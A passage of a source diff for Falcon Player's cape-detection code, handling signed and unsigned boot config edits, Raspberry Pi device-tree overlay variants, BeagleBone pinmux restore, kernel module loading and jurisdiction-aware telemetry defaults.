+            if (v.empty()) {
+                continue;
+            }
+            if (!trusted && !UnsignedBootConfigLineAllowed(v)) {
+                printf("CapeUtils: unsigned cape may not remove \"%s\" from the boot config\n", v.c_str());
+                continue;
+            }
+            if (!trusted) {
+                removeDirectiveLines(current, v);
+                continue;
+            }
+            size_t pos = std::string::npos;
+            while ((pos = current.find(v)) != std::string::npos) {
+                // If found then erase it from string
+                current.erase(pos, v.length());
+            }
+        }
+    }
+    if (bootConfig.isMember("append")) {
+        for (int x = 0; x < bootConfig["append"].size(); x++) {
+            std::string v = bootConfig["append"][x].asString();
+            if (!trusted && !UnsignedBootConfigLineAllowed(v)) {
+                printf("CapeUtils: unsigned cape may not add \"%s\" to the boot config\n", v.c_str());
+                continue;
+            }
+            if (!configContainsDirective(current, v)) {
+                // If not  found then append it
+                printf("Adding config option: %s\n", v.c_str());
+                current += "\n";
+                current += v;
+                current += "\n";
+            }
+        }
+    }
+    free(data);
+    if (current != orig) {
+        put_file_contents(fileName, (const uint8_t*)current.c_str(), current.length());
+    }
+    return current != orig;
+}
+static void handleReboot(bool r) {
+    if (r) {
+        if (file_exists("/.fppcapereboot")) {
+            const std::string msg = "Reboot Cycle Detected with FPP Cape Detect";
+            put_file_contents("/home/fpp/media/tmp/reboot", (const uint8_t*)msg.c_str(), msg.length());
+            printf("%s\n", msg.c_str());
+        } else {
+            const uint8_t data[2] = { 32, 0 };
+            put_file_contents("/.fppcapereboot", data, 1);
+            sync();
+            setuid(0);
+            reboot(RB_AUTOBOOT);
+            exit(0);
+        }
+    } else {
+        remove("/.fppcapereboot");
+    }
+}
+static void copyFile(const std::string& src, const std::string& target) {
+    int s, t;
+    s = open(src.c_str(), O_RDONLY);
+    if (s == -1) {
+        printf("Failed to open src %s - %s\n", src.c_str(), strerror(errno));
+        return;
+    }
+
+    size_t fsep = target.find_last_of("/");
+    if (fsep != std::string::npos)
+        mkdir(target.substr(0, fsep).c_str(), S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH); // ensure target folder exists
+                                                                                                //         if (mkdir(path, mode) != 0 && errno != EEXIST)
+                                                                                                //     else if (!S_ISDIR(st.st_mode)) errno = ENOTDIR;
+
+    t = open(target.c_str(), O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH);
+    if (t == -1) {
+        printf("Failed to open target %s - %s\n", target.c_str(), strerror(errno));
+        close(s);
+        return;
+    }
+    uint8_t buf[257];
+    while (true) {
+        int l = read(s, buf, 256);
+        if (l == -1) {
+            printf("Error copying file %s - %s\n", src.c_str(), strerror(errno));
+            close(s);
+            close(t);
+            return;
+        } else if (l == 0) {
+            close(s);
+            close(t);
+            return;
+        }
+        write(t, buf, l);
+    }
+}
+// similar to copy file, but do in 512 increments and check if the last 64 bytes are 0xFF
+// to see if we can detect the end of the actual data and stop at that point as reading
+// more data then needed is slow on the i2c bus
+static void copyEEPROM(const std::string& src, const std::string& target) {
+    int s, t;
+    s = open(src.c_str(), O_RDONLY);
+    if (s == -1) {
+        printf("Failed to open src %s - %s\n", src.c_str(), strerror(errno));
+        return;
+    }
+
+    size_t fsep = target.find_last_of("/");
+    if (fsep != std::string::npos)
+        mkdir(target.substr(0, fsep).c_str(), S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH); // ensure target folder exists
+                                                                                                //         if (mkdir(path, mode) != 0 && errno != EEXIST)
+                                                                                                //     else if (!S_ISDIR(st.st_mode)) errno = ENOTDIR;
+
+    t = open(target.c_str(), O_RDWR | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH);
+    if (t == -1) {
+        printf("Failed to open target %s - %s\n", target.c_str(), strerror(errno));
+        close(s);
+        return;
+    }
+    constexpr int BUFSIZE = 256;
+    uint8_t buf[BUFSIZE + 1];
+    while (true) {
+        int l = read(s, buf, BUFSIZE);
+        while (l > 0 && l < BUFSIZE) {
+            int r = read(s, &buf[l], BUFSIZE - l);
+            if (r == -1) {
+                printf("Error copying file %s - %s\n", src.c_str(), strerror(errno));
+                close(s);
+                close(t);
+                return;
+            }
+            l += r;
+        }
+        if (l == -1) {
+            printf("Error copying file %s - %s\n", src.c_str(), strerror(errno));
+            close(s);
+            close(t);
+            return;
+        } else if (l == 0) {
+            close(s);
+            close(t);
+            return;
+        }
+        write(t, buf, l);
+        if (l > 64) {
+            bool allFF = true;
+            for (int x = 0; x < 64; x++) {
+                if (buf[l - x - 1] != 0xFF) {
+                    allFF = false;
+                    break;
+                }
+            }
+            if (allFF) {
+                close(s);
+                close(t);
+                return;
+            }
+        }
+    }
+}
+static size_t fileSize(const std::string& target) {
+    struct stat stat_buf;
+    int rc = stat(target.c_str(), &stat_buf);
+    return rc == 0 ? stat_buf.st_size : 0;
+}
+
+static void copyIfNotExist(const std::string& src, const std::string& target) {
+    if (fileSize(target) > 0) {
+        return;
+    }
+    copyFile(src, target);
+}
+static void removeIfExist(const std::string& src) {
+    if (file_exists(src)) {
+        unlink(src.c_str());
+    }
+}
+void setOwnerGroup(const std::string& filename) {
+    uid_t fppUid = 0;
+    gid_t fppGid = 0;
+    if (getFppUserIds(fppUid, fppGid)) {
+        chown(filename.c_str(), fppUid, fppGid);
+    }
+}
+bool setFilePerms(const std::string& filename) {
+    mode_t mode = S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH;
+    chmod(filename.c_str(), mode);
+    setOwnerGroup(filename);
+    return true;
+}
+#if defined(PLATFORM_PI)
+// A cape EEPROM ships a base device tree overlay as fpp-cape-overlay-rpi.dtb.  It
+// may also ship board specific variants named fpp-cape-overlay-rpi-<filter>.dtb,
+// where <filter> is a config.txt conditional filter -- "pi5", "pi4", "pi02", "cm4"
+// and so on.  Each variant is installed as fpp-cape-overlay-<filter>.dtbo and
+// referenced from a block that this code owns end to end:
+//
+//     # FPP Cape Overlay Variants - BEGIN (managed by fppcapedetect, do not edit)
+//     [pi5]
+//     dtoverlay=fpp-cape-overlay-pi5
+//     [all]
+//     # FPP Cape Overlay Variants - END
+//
+// The point of the variants is that a symbol a fragment references has to exist in
+// the base DTB or the firmware discards the WHOLE overlay, not just that fragment
+// -- a Pi 5 only node such as rpi_rtc in an otherwise portable overlay leaves a Pi 4
+// with no codec, no RTC and no i2s, and the only trace is a dterror in
+// /proc/device-tree/chosen/user-warnings.  Splitting the board specific fragments
+// out into a filtered overlay keeps the base resolvable everywhere.
+//
+// The block is rewritten wholesale from the variants actually present, which is what
+// makes removal work: swap in a cape that ships no pi5 variant, and the previous
+// cape's [pi5] line has to go with it or the firmware fails to resolve an overlay
+// that is no longer on disk.  Anything outside the markers is left untouched, and
+// the block always closes with [all] so a later append (this file's own bootConfig
+// handling appends at EOF) does not land inside somebody's filter.
+static const std::string CAPE_OVERLAY_VARIANT_BEGIN = "# FPP Cape Overlay Variants - BEGIN (managed by fppcapedetect, do not edit)";
+static const std::string CAPE_OVERLAY_VARIANT_END = "# FPP Cape Overlay Variants - END";
+static const std::string CAPE_OVERLAY_SRC_PREFIX = "fpp-cape-overlay-rpi-";
+static const std::string CAPE_OVERLAY_SRC_SUFFIX = ".dtb";
+static const std::string CAPE_OVERLAY_VARIANT_PREFIX = "fpp-cape-overlay-";
+static const std::string CAPE_OVERLAY_VARIANT_SUFFIX = ".dtbo";
+
+static const std::string& capeOverlayDir() {
+    static const std::string dir = file_exists("/boot/firmware/overlays") ? "/boot/firmware/overlays/" : "/boot/overlays/";
+    return dir;
+}
+
+// config.txt filter names are [pi5], [board-type=0x10], [HDMI:1] and similar.  This
+// is deliberately a strict allowlist rather than a blocklist: the name arrives from
+// an EEPROM as part of a filename and is written verbatim into config.txt and into a
+// path under /boot, so a newline or a slash in it would be a way to inject boot
+// configuration or to write outside the overlays directory.
+static bool isValidOverlayFilter(const std::string& f) {
+    if (f.empty() || f.length() > 64) {
+        return false;
+    }
+    for (char c : f) {
+        if (!(std::isalnum(static_cast<unsigned char>(c)) || c == '_' || c == '-' ||
+              c == '.' || c == '+' || c == ':' || c == '=')) {
+            return false;
+        }
+    }
+    return true;
+}
+
+// Rewrite (or drop) the managed block so it names exactly the given filters.
+// Returns true if config.txt actually changed.
+static bool writeCapeOverlayVariantBlock(const std::set<std::string>& filters) {
+    const std::string configFile = findBootConfigFile("config.txt");
+    if (configFile.empty()) {
+        return false;
+    }
+    int len = 0;
+    char* data = (char*)get_file_contents(configFile, len);
+    std::string orig(data, len);
+    free(data);
+
+    std::string current = orig;
+    if (filters.empty() && current.find(CAPE_OVERLAY_VARIANT_BEGIN) == std::string::npos) {
+        // Nothing to write and nothing of ours to remove.  Returning here rather
+        // than falling into the rewrite below is not an optimisation: the trailing
+        // newline normalisation would rewrite an untouched config.txt on any box
+        // whose file ends in a blank line, and a changed config.txt is what makes
+        // cape detection reboot.  Every Pi with a cape that ships no variants would
+        // take one reboot for a cosmetic whitespace diff.
+        return false;
+    }
+    // Strip any block we wrote before.  Tolerate a truncated block (BEGIN with no
+    // END, from an interrupted write) by cutting to end of file rather than leaving
+    // a marker behind that the next run would then nest a second block inside.
+    size_t begin = current.find(CAPE_OVERLAY_VARIANT_BEGIN);
+    while (begin != std::string::npos) {
+        size_t end = current.find(CAPE_OVERLAY_VARIANT_END, begin);
+        end = (end == std::string::npos) ? current.length()
+                                         : end + CAPE_OVERLAY_VARIANT_END.length();
+        if (end < current.length() && current[end] == '\n') {
+            ++end;
+        }
+        current.erase(begin, end - begin);
+        begin = current.find(CAPE_OVERLAY_VARIANT_BEGIN);
+    }
+    while (!current.empty() && current.back() == '\n') {
+        current.pop_back();
+    }
+    current += "\n";
+
+    if (!filters.empty()) {
+        current += "\n" + CAPE_OVERLAY_VARIANT_BEGIN + "\n";
+        for (const auto& f : filters) {
+            current += "[" + f + "]\n";
+            current += "dtoverlay=" + CAPE_OVERLAY_VARIANT_PREFIX + f + "\n";
+        }
+        current += "[all]\n";
+        current += CAPE_OVERLAY_VARIANT_END + "\n";
+    }
+
+    if (current == orig) {
+        return false;
+    }
+    put_file_contents(configFile, (const uint8_t*)current.c_str(), current.length());
+    return true;
+}
+
+// Install the board specific overlays this cape ships and remove the ones it does
+// not, then point config.txt at exactly that set.  srcDir empty means "no cape",
+// which clears everything.
+// The variants a cape ships, as filter name -> source path.  srcDir empty or
+// missing means "no cape", which is a legitimate answer of none.
+static std::map<std::string, std::string> collectCapeOverlayVariants(const std::string& srcDir) {
+    std::map<std::string, std::string> variants;
+    if (srcDir.empty() || !file_exists(srcDir)) {
+        return variants;
+    }
+    std::error_code ec;
+    for (const auto& entry : std::filesystem::directory_iterator(srcDir, ec)) {
+        const std::string name = entry.path().filename().string();
+        if (name.rfind(CAPE_OVERLAY_SRC_PREFIX, 0) != 0 ||
+            name.length() <= CAPE_OVERLAY_SRC_PREFIX.length() + CAPE_OVERLAY_SRC_SUFFIX.length() ||
+            name.compare(name.length() - CAPE_OVERLAY_SRC_SUFFIX.length(),
+                         CAPE_OVERLAY_SRC_SUFFIX.length(), CAPE_OVERLAY_SRC_SUFFIX) != 0) {
+            continue;
+        }
+        const std::string filter = name.substr(CAPE_OVERLAY_SRC_PREFIX.length(),
+                                               name.length() - CAPE_OVERLAY_SRC_PREFIX.length() - CAPE_OVERLAY_SRC_SUFFIX.length());
+        if (!isValidOverlayFilter(filter)) {
+            printf("CapeUtils: ignoring cape overlay variant with invalid filter name: %s\n", name.c_str());
+            continue;
+        }
+        // "default" is the stock overlay this code falls back to, and "all" would
+        // just be the base overlay under another name.  Neither may be a variant.
+        if (filter == "default" || filter == "all") {
+            printf("CapeUtils: ignoring reserved cape overlay variant: %s\n", name.c_str());
+            continue;
+        }
+        variants[filter] = entry.path().string();
+    }
+    return variants;
+}
+
+static bool syncCapeOverlayVariants(const std::string& srcDir) {
+    std::set<std::string> filters;
+    bool changed = false;
+
+    for (const auto& [filter, src] : collectCapeOverlayVariants(srcDir)) {
+        const std::string target = capeOverlayDir() + CAPE_OVERLAY_VARIANT_PREFIX + filter + CAPE_OVERLAY_VARIANT_SUFFIX;
+        filters.insert(filter);
+
+        int slen = 0;
+        int tlen = 0;
+        uint8_t* sd = get_file_contents(src, slen);
+        uint8_t* td = file_exists(target) ? get_file_contents(target, tlen) : nullptr;
+        if (td == nullptr || slen != tlen || memcmp(sd, td, slen) != 0) {
+            printf("Installing cape overlay variant [%s]\n", filter.c_str());
+            copyFile(src, target);
+            changed = true;
+        }
+        free(sd);
+        free(td);
+    }
+
+    // Drop variants left behind by a previous cape.  Only files matching the name we
+    // generate are considered, and the shipped default is never one of them.
+    std::error_code ec;
+    for (const auto& entry : std::filesystem::directory_iterator(capeOverlayDir(), ec)) {
+        const std::string name = entry.path().filename().string();
+        if (name.rfind(CAPE_OVERLAY_VARIANT_PREFIX, 0) != 0 ||
+            name.length() <= CAPE_OVERLAY_VARIANT_PREFIX.length() + CAPE_OVERLAY_VARIANT_SUFFIX.length() ||
+            name.compare(name.length() - CAPE_OVERLAY_VARIANT_SUFFIX.length(),
+                         CAPE_OVERLAY_VARIANT_SUFFIX.length(), CAPE_OVERLAY_VARIANT_SUFFIX) != 0) {
+            continue;
+        }
+        const std::string filter = name.substr(CAPE_OVERLAY_VARIANT_PREFIX.length(),
+                                               name.length() - CAPE_OVERLAY_VARIANT_PREFIX.length() - CAPE_OVERLAY_VARIANT_SUFFIX.length());
+        if (filter == "default" || filters.find(filter) != filters.end()) {
+            continue;
+        }
+        printf("Removing stale cape overlay variant [%s]\n", filter.c_str());
+        unlink(entry.path().string().c_str());
+        changed = true;
+    }
+
+    // config.txt is the authority on what is actually applied, so a change here
+    // counts even when every .dtbo on disk already happened to be correct.
+    changed |= writeCapeOverlayVariantBlock(filters);
+    return changed;
+}
+#endif
+
+// Whether two files both exist and hold identical bytes.  Overlays are a couple
+// of KB, so comparing them outright is simpler than tracking versions.
+static bool filesIdentical(const std::string& a, const std::string& b) {
+    int alen = 0;
+    int blen = 0;
+    uint8_t* ad = file_exists(a) ? get_file_contents(a, alen) : nullptr;
+    uint8_t* bd = file_exists(b) ? get_file_contents(b, blen) : nullptr;
+    bool same = ad != nullptr && bd != nullptr && alen == blen && memcmp(ad, bd, alen) == 0;
+    free(ad);
+    free(bd);
+    return same;
+}
+
+static void restoreDefaultCapeOverlay() {
+#if defined(PLATFORM_BB64)
+    copyFile("/boot/firmware/overlays/fpp-cape-overlay-default.dtb", "/boot/firmware/overlays/fpp-cape-overlay.dtb");
+#elif defined(PLATFORM_PI)
+    copyFile("/boot/firmware/overlays/fpp-cape-overlay-default.dtbo", "/boot/firmware/overlays/fpp-cape-overlay.dtbo");
+    // Back to the stock overlay means back to no variants; leaving a [pi5] line
+    // pointing at the last cape's .dtbo would fail to resolve on the next boot.
+    syncCapeOverlayVariants("");
+#elif defined(PLATFORM_BBB)
+    copyFile("/lib/firmware/fpp-cape-overlay-default.dtb", "/lib/firmware/fpp-cape-overlay.dtb");
+#endif
+}
+static bool handleCapeOverlay(const std::string& outputPath) {
+#ifdef PLATFORM_BB64
+    static const std::string src = outputPath + "/tmp/fpp-cape-overlay-bb64.dtb";
+    static const std::string target = "/boot/firmware/overlays/fpp-cape-overlay.dtb";
+    static const std::string defaultOverlay = "/boot/firmware/overlays/fpp-cape-overlay-default.dtb";
+#elif defined(PLATFORM_BBB)
+    static const std::string src = outputPath + "/tmp/fpp-cape-overlay-bbb.dtb";
+    static const std::string target = "/lib/firmware/fpp-cape-overlay.dtb";
+    static const std::string defaultOverlay = "/lib/firmware/fpp-cape-overlay-default.dtb";
+#elif defined(PLATFORM_PI)
+    static const std::string src = outputPath + "/tmp/fpp-cape-overlay-rpi.dtb";
+    static const std::string target = "/boot/firmware/overlays/fpp-cape-overlay.dtbo";
+    static const std::string defaultOverlay = "/boot/firmware/overlays/fpp-cape-overlay-default.dtbo";
+    // FPP 9.x has the param in config.txt set wrong for the RPi, so we need to check for that and if it's wrong then we need to flip it to the correct one
+    const std::string configFile = findBootConfigFile("config.txt");
+    if (!configFile.empty()) {
+        int len = 0;
+        char* data = (char*)get_file_contents(configFile, len);
+        std::string configData(data, len);
+        free(data);
+        if (!configContainsDirective(configData, "dtoverlay=fpp-cape-overlay")) {
+            // not found, need to add it
+            printf("Adding dtoverlay=fpp-cape-overlay to config.txt\n");
+            if (configData.find("dtparam=fpp-cape-overlay") != std::string::npos) {
+                // replace the wrong param with the right one
+                size_t pos = configData.find("dtparam=fpp-cape-overlay");
+                configData.replace(pos, strlen("dtparam=fpp-cape-overlay"), "dtoverlay=fpp-cape-overlay"); 
+            } else {
+                // [all] first: this appends at end of file, and whatever section
+                // the file happens to end in is inherited.  A config.txt whose
+                // last section is a board filter would otherwise scope the cape's
+                // own overlay to that board and leave every other Pi with no cape.
+                configData += "\n[all]\ndtoverlay=fpp-cape-overlay\n";
+            }
+            put_file_contents(configFile, (const uint8_t*)configData.c_str(), configData.size());
+        }
+    }
+
+
+#else
+    static const std::string src = "";
+    static const std::string target = "";
+    static const std::string defaultOverlay = "";
+#endif
+    bool changed = false;
+    bool haveBase = !src.empty() && file_exists(src);
+#if defined(PLATFORM_PI)
+    // A cape whose overlay is entirely board specific ships variants and no
+    // portable base.  That is still a cape with an overlay, and must not fall
+    // through to the "no cape, restore the default" branch below.
+    const std::string variantDir = outputPath + "/tmp";
+    const bool haveVariants = !collectCapeOverlayVariants(variantDir).empty();
+#else
+    const bool haveVariants = false;
+#endif
+    if (haveBase) {
+        if (!filesIdentical(src, target)) {
+            copyFile(src, target);
+            changed = true;
+        }
+    } else if (!haveVariants) {
+        // The cape brings no overlay, so the shipped default belongs here.  Ask
+        // whether what is installed already IS the default by comparing the two
+        // files (which also clears any variants the old cape installed).
+        //
+        // Not by reading /proc/device-tree/chosen/overlays/fpp-cape-overlay, as
+        // this did before: that node exists only when an overlay actually
+        // RESOLVED.  A stale overlay left behind by a previous cape that cannot
+        // resolve on this board -- a fragment referencing a Pi 5 only symbol, on
+        // a Pi 4 -- creates no such node, so it was indistinguishable from "no
+        // cape overlay applied" and the restore was skipped.  The one state that
+        // cannot recover by itself was the one state never repaired, on every
+        // boot, indefinitely.
+        if (!filesIdentical(target, defaultOverlay) && file_exists(defaultOverlay)) {
+            restoreDefaultCapeOverlay();
+            changed = true;
+        }
+    }
+#if defined(PLATFORM_PI)
+    if (haveBase || haveVariants) {
+        // Board specific companions to the base overlay.  Outside the compare
+        // above because it has to run even when the base overlay is already up to
+        // date -- the variants change independently of it.  Skipped when neither
+        // is present, since restoreDefaultCapeOverlay() has already cleared them.
+        changed |= syncCapeOverlayVariants(variantDir);
+    }
+#endif
+    return changed;
+}
+
+#ifdef PLATFORM_BBB
+bool isPocketBeagle() {
+    bool ret = false;
+    FILE* file = fopen("/proc/device-tree/model", "r");
+    if (file) {
+        char buf[256];
+        fgets(buf, 256, file);
+        fclose(file);
+        if (strcmp(&buf[10], "PocketBeagle") == 0) {
+            ret = true;
+        }
+    }
+    return ret;
+}
+// Query a pin's current pinmux mode name via the pinctrl tool. Reads work on
+// both am335xpm and older /dev/mem kernels. Returns "" if the mode can't be
+// determined, which callers must treat as "don't touch this pin".
+//
+// Uses "-l" rather than "-q" because only "-l" marks the current mode
+// unambiguously, in brackets:  "gpio gpio_out gpio_pd [gpio_pu] i2c ...".
+// "-q" prints the raw register value followed by *every* mode name that matches
+// it, so its trailing token is whichever alias happens to sort last -- P9_17 at
+// mux mode 2 comes back "i2c_scl", not "i2c", because both names map to the same
+// PIN_INPUT_PULLUP|2 -- and when no named mode matches the value at all, the last
+// token is a bare hex number that "-s" would just reject.
+static std::string PinCurrentMode(const std::string& pin) {
+    if (!file_exists("/usr/bin/pinctrl")) {
+        return "";
+    }
+    std::string out;
+    std::string cmd = "/usr/bin/pinctrl -l " + CapeShellQuote(pin) + " 2>/dev/null";
+    FILE* p = popen(cmd.c_str(), "r");
+    if (p) {
+        char buf[256];
+        while (fgets(buf, sizeof(buf), p)) {
+            out += buf;
+        }
+        pclose(p);
+    }
+    size_t ob = out.find('[');
+    if (ob == std::string::npos) {
+        return "";
+    }
+    size_t cb = out.find(']', ob);
+    if (cb == std::string::npos) {
+        return "";
+    }
+    return out.substr(ob + 1, cb - ob - 1);
+}
+void ConfigurePin(const char* pin, const char* mode) {
+    // Prefer the pinctrl tool: it writes via /dev/am335xpm on am335xpm kernels
+    // (where direct userspace register writes are silently dropped) and via the
+    // bone-pinmux-helper sysfs on older kernels. Fall back to the helper sysfs
+    // directly only if the tool is absent (keeps pre-pinctrl images working).
+    if (file_exists("/usr/bin/pinctrl") && pin[0] == 'P' && (pin[2] == '_' || pin[2] == '-')) {
+        std::string cmd = "/usr/bin/pinctrl -s " + CapeShellQuote(pin) + " " + CapeShellQuote(mode);
+        if (system(cmd.c_str()) == 0) {
+            return;
+        }
+    }
+    char dir_name[255];
+    snprintf(dir_name, sizeof(dir_name),
+             "/sys/devices/platform/ocp/ocp:%s_pinmux/state",
+             pin);
+    FILE* dir = fopen(dir_name, "w");
+    if (!dir) {
+        return;
+    }
+    fprintf(dir, "%s\n", mode);
+    fclose(dir);
+}
+#endif
+void ConfigureI2C1BusPins(bool enable) {
+#ifdef PLATFORM_BBB
+    // The i2c1 pads are not dedicated to i2c -- on the BBB they are P9_17/P9_18,
+    // which capes routinely use as plain GPIO (the HE123's OLED Back/Enter
+    // buttons live there).  So borrowing them for a probe has to be exactly
+    // reversible, and there is no generic mode name that does that: the pinctrl
+    // tool has no "default" (P9_17 offers gpio/gpio_out/gpio_pd/gpio_pu/i2c/
+    // i2c_scl/spi/spi_cs0 plus "reset"), "reset" is bare PIN_INPUT|mode7 with no
+    // pull, and BBBPinCapabilities maps "default" to a bias-less "gpio".  Handing
+    // back any of those turns a pulled-up button pin into a floating one.  The
+    // pin's real default is whatever the DT/overlay/cape put there, so capture
+    // that exact mode and write the same string back.  Mirrors what
+    // findCapeEEPROM() already does for the i2c2 pads.
+    //
+    // Restoring only when the capture succeeded is deliberate: with no known-good
+    // mode to return to, leaving the pad muxed to i2c is at least a state the
+    // logs explain, whereas guessing puts a button pin somewhere nobody asked for.
+    static std::string origMode1;
+    static std::string origMode2;
+
+    const bool pb = isPocketBeagle();
+    const char* pin1 = pb ? "P2_09" : "P9_17";
+    const char* pin2 = pb ? "P2_11" : "P9_18";
+
+    if (enable) {
+        origMode1 = PinCurrentMode(pin1);
+        origMode2 = PinCurrentMode(pin2);
+        ConfigurePin(pin1, "i2c");
+        ConfigurePin(pin2, "i2c");
+    } else {
+        if (!origMode1.empty()) {
+            ConfigurePin(pin1, origMode1.c_str());
+        } else {
+            printf("Could not read the original mode of %s; leaving it muxed for i2c1\n", pin1);
+        }
+        if (!origMode2.empty()) {
+            ConfigurePin(pin2, origMode2.c_str());
+        } else {
+            printf("Could not read the original mode of %s; leaving it muxed for i2c1\n", pin2);
+        }
+        origMode1.clear();
+        origMode2.clear();
+    }
+#endif
+}
+
+// Kernel module names change over time, but a cape EEPROM is programmed once and
+// is then in the field forever, so an older EEPROM can name a module the running
+// kernel no longer has.  Map the old name onto the current one.  The map is only
+// consulted when the name from the EEPROM does not resolve on this kernel, so a
+// kernel that still has the old name keeps using it.
+// Note: modprobe treats '-' and '_' as equivalent, so only real renames belong here.
+static const std::map<std::string, std::string> LEGACY_MODULE_NAME_MAP = {
+    // ASoC codec drivers gained the snd_soc_ prefix
+    { "pcm5102a", "snd_soc_pcm5102a" }
+};
+
+static bool moduleNameResolves(const std::string& module) {
+    std::string cmd = "/sbin/modprobe -n -q " + QuotedModuleSpec(module) + " > /dev/null 2>&1";
+    return system(cmd.c_str()) == 0;
+}
+
+// modprobe every module the cape asks for, mapping any renamed-since-programmed
+// names to what this kernel calls them.  Loading these at detect time rather than
+// letting them autoload keeps a cape's sound card/RTC/GPIO expander from showing
+// up after the rest of boot has already given up on it.
+static void loadModules(const Json::Value& modules) {
+    for (int x = 0; x < modules.size(); x++) {
+        std::string module = modules[x].asString();
+        if (module.empty()) {
+            continue;
+        }
+        if (!moduleNameResolves(module)) {
+            auto it = LEGACY_MODULE_NAME_MAP.find(module);
+            if (it != LEGACY_MODULE_NAME_MAP.end() && moduleNameResolves(it->second)) {
+                printf("Cape module \"%s\" not found, loading \"%s\" instead\n", module.c_str(), it->second.c_str());
+                module = it->second;
+            } else {
+                printf("Cape module \"%s\" is not available on this kernel\n", module.c_str());
+                continue;
+            }
+        }
+        exec("/sbin/modprobe " + QuotedModuleSpec(module) + " 2> /dev/null  > /dev/null");
+    }
+}
+
+static std::map<std::string, std::string> CONFIG_EEPROM_UPGRADE_MAP = {
+    { "RPIWS281X:PiHat", "PiHat" },
+    { "spixels:spixels", "spixels" },
+    { "RPIWS281X:rPi-MFC", "rPi-MFC" },
+    { "RPIWS281X:rPi-28D", "rPi-28D" },
+    // The RPIWS281X entries above are only matched until the config is migrated to DPI.
+    // These map the migrated configs back to the same EEPROMs so a cape that loses its
+    // config/cape-eeprom.bin after migrating can still have it reinstalled.
+    { "DPIPixels:PiHat-DPIPixels", "PiHat" },
+    { "DPIPixels:rPi-MFC-DPIPixels", "rPi-MFC" },
+    { "DPIPixels:rPi-28D-DPIPixels", "rPi-28D" },
+    { "DPIPixels:rPi-28D-DPIPixels-4", "rPi-28D" },
+    { "BBB48String:F8-B", "F8-B" },
+    { "BBB48String:F8-B-16", "F8-B" },
+    { "BBB48String:F8-B-20", "F8-B" },
+    { "BBB48String:F8-B-EXP", "F8-B" },
+    { "BBB48String:F8-B-EXP-32", "F8-B" },
+    { "BBB48String:F8-B-EXP-36", "F8-B" },
+    { "BBB48String:F16-B", "F16-B" },
+    { "BBB48String:F16-B-32", "F16-B" },
+    { "BBB48String:F16-B-48", "F16-B" },
+    { "BBB48String:F4-B", "F4-B" },
+    { "BBB48String:F32-B", "F-32" },
+    { "BBB48String:F32-B-44", "F-32" },
+    { "BBB48String:F32-B-48", "F-32" },
+    { "BBB48String:RGBCape24", "RGB-123" },
+    { "BBB48String:RGBCape48A", "RGB-123" },
+    { "BBB48String:RGBCape48C", "RGB-123" },
+    { "BBB48String:RGBCape48F", "RGB-123" },
+    { "BBB48String:PB16", "PB16" },
+    { "BBB48String:PB16-EXP", "PB16" }
+};
+
+static const char* capeStatusName(CapeUtils::CapeStatus st) {
+    switch (st) {
+    case CapeUtils::CapeStatus::NOT_PRESENT:
+        return "NOT_PRESENT";
+    case CapeUtils::CapeStatus::CORRUPT:
+        return "CORRUPT";
+    case CapeUtils::CapeStatus::UNSIGNED:
+        return "UNSIGNED";
+    case CapeUtils::CapeStatus::SIGNED_GENERIC:
+        return "SIGNED_GENERIC";
+    case CapeUtils::CapeStatus::SIGNED:
+        return "SIGNED";
+    }
+    return "UNKNOWN";
+}
+
+// ---------------------------------------------------------------------------
+// Privacy jurisdiction
+//
+// A cape may set a default where the user has not chosen one, but it may only
+// move a *telemetry* setting toward transmitting more where the jurisdiction
+// permits a transmitting default at all. Which jurisdictions those are lives in
+// etc/jurisdictions.json, read by both this and the PHP side, so the policy is
+// stated once rather than re-listed per consumer.
+//
+// Everything here fails toward the permissive side ONLY on a positive match.
+// An unreadable file, an unknown jurisdiction, or a value nobody has set yet
+// resolves through inferJurisdiction()/priorOptInRequired() rather than by
+// assuming.
+// ---------------------------------------------------------------------------
+static const std::string JURISDICTIONS_FILE = "/opt/fpp/etc/jurisdictions.json";
+
+// Value of a key in /home/fpp/media/settings, or "" when absent.
+// Matches on the exact key rather than a prefix: "statsPublish" must not be
+// satisfied by a line for "statsPublishUrl".
+static std::string readSettingValue(const std::vector<std::string>& lines, const std::string& key) {
+    for (const auto& line : lines) {
+        std::size_t eq = line.find('=');
+        if (eq == std::string::npos) {
+            continue;
+        }
+        std::string k = trim(line.substr(0, eq));
+        if (k != key) {
+            continue;
+        }
+        std::string v = trim(line.substr(eq + 1));
+        if (v.size() >= 2 && v.front() == '"' && v.back() == '"') {
+            v = v.substr(1, v.size() - 2);
+        }
+        return v;
+    }
+    return "";
+}
+
+// True when the key already has a value in the settings file. A cape never
+// overrides one, whatever it is and whatever the jurisdiction.
+static bool settingIsSet(const std::vector<std::string>& lines, const std::string& key) {
+    for (const auto& line : lines) {
+        std::size_t eq = line.find('=');
+        if (eq != std::string::npos && trim(line.substr(0, eq)) == key) {
+            return true;
+        }
+    }
+    return false;
+}
+
+// The jurisdiction to judge by: the recorded answer, or -- when it has never
+// been answered -- an inference from the time zone, which every device already
+// has. The inference is used for this decision only and is never written back;
+// a real answer always wins. Longest prefix wins so Europe/London reads as UK
+// rather than falling into the shorter Europe/ entry.
+static std::string inferJurisdiction(const std::vector<std::string>& lines, const Json::Value& cfg) {
+    std::string recorded = readSettingValue(lines, "LegalJurisdiction");
+    if (!recorded.empty()) {
+        return recorded;
+    }
+    std::string tz = readSettingValue(lines, "TimeZone");
+    if (tz.empty() || !cfg.isMember("timezonePrefix")) {
+        return "";
+    }
+    std::string best;
+    std::string bestPrefix;
+    for (const auto& prefix : cfg["timezonePrefix"].getMemberNames()) {
+        if (tz.rfind(prefix, 0) == 0 && prefix.size() > bestPrefix.size()) {
+            bestPrefix = prefix;
+            best = cfg["timezonePrefix"][prefix].asString();
+        }
+    }
+    return best;
+}
+
+// Set only for a dry run, so the wizard can ask "what if the answer were X"
+// before the answer has been written anywhere.
+static std::string g_jurisdictionOverride;
+
+static bool priorOptInRequired(const std::vector<std::string>& lines) {
+    Json::Value cfg;
+    if (!LoadJsonFromFile(JURISDICTIONS_FILE, cfg, CapeJsonRoot::Object)) {
+        // No policy file: take the cautious branch. Refusing a permissive cape
+        // default is recoverable -- the user can still set it -- where wrongly
+        // allowing one is not.
+        printf("CapeUtils: %s unreadable, treating jurisdiction as requiring prior opt-in\n",
